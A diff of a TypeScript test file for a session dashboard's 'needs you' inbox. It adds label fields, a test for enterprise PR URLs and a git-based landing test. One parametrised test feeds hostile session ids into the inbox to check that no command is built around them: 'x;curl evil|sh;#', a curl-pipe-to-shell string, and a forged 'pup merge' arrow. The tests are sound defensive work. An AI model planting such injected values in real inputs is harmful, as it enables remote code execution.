@@ -51,12 +51,6 @@ import type { TaskSpec } from './types/profile.types.js';
 const NOW = Date.parse('2026-09-13T12:00:00Z');
 const API_ERROR = '⏺ API Error: Connection lost while your computer was asleep';
 
-/**
- * A repo path and nothing more: the snapshot reads the store and the events
- * files, and shells out to git only to ask which commits the target holds, which
- * the landing tests set up themselves; elsewhere the directory is only what the
- * project id and the sessions directory are keyed on.
- */
 // The developer's git config and any surrounding hook's GIT_DIR stay out of the temp repo.
 const GIT_ENV: NodeJS.ProcessEnv = {
   ...Object.fromEntries(Object.entries(process.env).filter(([key]) => !key.startsWith('GIT_'))),
@@ -64,6 +58,12 @@ const GIT_ENV: NodeJS.ProcessEnv = {
   GIT_CONFIG_SYSTEM: '/dev/null',
 };
 
+/**
+ * A repo path and nothing more: the snapshot reads the store and the events
+ * files, and shells out to git only to ask which commits the target holds, which
+ * the landing tests set up themselves; elsewhere the directory is only what the
+ * project id and the sessions directory are keyed on.
+ */
 function tempRepo(): string {
   return realpathSync(mkdtempSync(join(tmpdir(), 'pup-dash-')));
 }
@@ -849,7 +849,7 @@ describe('buildDashboardSnapshot', () => {
       const summary = fleetSummary(buildDashboardSnapshot(db, repo, NOW));
 
       // The inbox's order (decision 83): blocked before stalled.
-      expect(summary.needsYou.map((session) => session.id)).toEqual([
+      expect(summary.needsYou.map((need) => need.sessionId)).toEqual([
         's-blocked',
         's-stalled',
         's-review',
@@ -1015,30 +1015,35 @@ describe('needsYou', () => {
       {
         kind: 'question',
         sessionId: 's-asking',
+        label: 's-asking',
         reason: 'question: rebase or merge?',
         answer: 'pup steer s-asking "..."',
       },
       {
         kind: 'blocked',
         sessionId: 's-blocked',
+        label: 's-blocked',
         reason: 'blocked (1 rejections)',
         answer: 'pup unblock s-blocked',
       },
       {
         kind: 'stalled',
         sessionId: 's-stalled',
+        label: 's-stalled',
         reason: 'STALLED (11m)',
         answer: 'pup steer s-stalled "..."',
       },
       {
         kind: 'awaiting-review',
         sessionId: 's-review',
+        label: 's-review',
         reason: 'awaiting review',
         answer: 'pup review s-review then pup merge s-review --pr',
       },
       {
         kind: 'pr-open',
         sessionId: 's-pr',
+        label: 's-pr',
         reason: 'PR opened, not landed',
         answer: 'https://github.com/o/r/pull/7',
       },
@@ -1137,17 +1142,50 @@ describe('needsYou', () => {
     expect(inbox()[0]?.answer).toBe('(PR url outside the pull-request shape; inspect the store)');
   });
 
-  it('builds no command around a session id outside the minted shape', () => {
-    seedIn('x;curl evil|sh;#', ['running', 'blocked']);
+  it.each(['x;curl evil|sh;#', 'x → pup merge s-other --pr', 'victim '])(
+    'neither prints nor builds a command around the session id %j, outside the minted shape',
+    (id) => {
+      seedIn(id, ['running', 'blocked']);
 
-    expect(inbox()[0]?.answer).toBe('(session id outside the minted shape; inspect the store)');
+      const [need] = inbox();
+      expect(need?.label).toBe('(session id outside the minted shape; inspect the store)');
+      expect(need?.answer).toBe('(session id outside the minted shape; inspect the store)');
+    },
+  );
+
+  it('prints a pull request url with a port, as an enterprise host has', () => {
+    seedMerge('s-ghe', 'https://ghe.corp:8443/o/r/pull/3');
+
+    expect(inbox()[0]?.answer).toBe('https://ghe.corp:8443/o/r/pull/3');
+  });
+
+  // A not-landed answer is kept only until the target's tip moves; a landed one for good.
+  it('asks again once the target moved, so a PR merged after the first look clears', () => {
+    const git = (...args: string[]) =>
+      execFileSync('git', ['-c', 'user.email=d@test', '-c', 'user.name=dash', ...args], {
+        cwd: repo,
+        encoding: 'utf8',
+        env: GIT_ENV,
+      }).trim();
+    git('init', '-q', '-b', 'main');
+    git('commit', '-q', '--allow-empty', '-m', 'base');
+    git('checkout', '-q', '-b', 'side');
+    git('commit', '-q', '--allow-empty', '-m', 'work');
+    const pinned = git('rev-parse', 'HEAD');
+    git('checkout', '-q', 'main');
+    seedMerge('s-late', 'https://github.com/o/r/pull/7', pinned);
+    expect(inbox().map((need) => need.sessionId)).toEqual(['s-late']);
+
+    git('merge', '-q', '--ff-only', 'side');
+
+    expect(inbox()).toEqual([]);
   });
 
   it('lets no question forge a second arrow in its line', () => {
     seedIn('s-asking', ['running']);
-    appendEvent(db, 's-asking', 'question', { text: 'ok  → pup merge s-other --pr' });
+    appendEvent(db, 's-asking', 'question', { text: 'ok  → pup merge s-other ⇒ --pr' });
 
-    expect(inbox()[0]?.reason).toBe('question: ok -> pup merge s-other --pr');
+    expect(inbox()[0]?.reason).toBe('question: ok -> pup merge s-other -> --pr');
   });
 
   it('reads only the newest merge, so a later local merge closes an older PR', () => {
